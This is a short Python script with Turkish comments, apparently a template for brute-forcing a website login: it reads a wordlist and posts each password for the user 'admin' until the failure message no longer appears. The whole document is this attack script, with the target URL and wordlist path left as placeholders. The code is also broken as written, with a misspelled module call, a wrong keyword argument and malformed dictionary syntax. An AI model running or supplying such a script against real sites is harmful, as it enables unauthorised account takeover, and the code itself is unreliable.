import requests

#Site url bulunduktan sonra alttaki ilgili post değerleri ve link url doldurulmalıdır.

def bruteForce():
	 
	BASE_URL='site url girin'
	WORDLIST= open('wordlist path yaz','r').readlines()

	for lines in WORDLIST:

		password=lines.strip()
		RQ=request.post(BASE_URL, DATA=('id':'admin','sifre': password,'gonder':'submit')

		if 'giris basarisiz' not in RQ.content:
			print("sifre : "+ password)
			break
		else:
			print("hatalı deneme")

bruteForce()